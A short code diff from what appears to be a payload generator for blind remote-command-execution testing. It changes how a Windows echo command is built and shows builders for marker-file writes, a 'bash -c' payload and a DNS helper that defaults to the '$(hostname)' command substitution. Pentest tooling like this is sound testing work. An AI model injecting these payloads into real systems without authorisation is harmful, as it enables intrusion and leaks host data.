@@ -173,7 +173,7 @@ def blind_dns_internal(token: str, settings: Settings, data_expr: str = "$(hostn
 def blind_file_write(path: str = "/tmp/oob.txt", content: str = "oob_rce_ok") -> dict[str, str]:
     return {
         "linux_cmd":    f"echo '{content}' > {path}",
-        "windows_cmd":  f"echo {content} > {path.replace('/','\\\\').lstrip('\\\\')}",
+        "windows_cmd":  "echo {} > {}".format(content, path.replace('/', '\\\\').lstrip('\\\\')),
         "verify_linux": f"cat {path}",
         "note":         f"After writing, fetch via known web path or check file existence to confirm RCE",
         "bash_redirect": f"bash -c 'echo {content} > {path}'",
